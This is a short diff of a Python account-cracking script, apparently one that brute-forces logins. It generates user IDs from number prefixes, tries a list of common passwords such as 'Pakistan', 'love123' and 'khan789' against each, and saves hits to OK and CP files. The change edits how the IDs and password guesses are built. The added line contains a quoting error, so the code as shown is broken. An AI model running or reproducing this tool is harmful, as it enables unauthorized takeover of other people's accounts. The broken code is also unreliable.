@@ -285,8 +285,8 @@ def m3():
         print('\x1b[1;91m [=] Crack started...,CTRL+C to stop the process...')
         lines()
         for guru in user:
-			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Pakistan','i love you','love123','khan789','mohummed']
+			uid = kode+guru
+			pwx = [guru,123',kode+'1234','Pakistan','i love you','love123','khan789','mohummed']
 			yaari.submit(c,uid,pwx,tl)
     print(46*'-')
     print('[✓]Total Idz saved : OK [Ok.txt] | CP [CP.txt]')
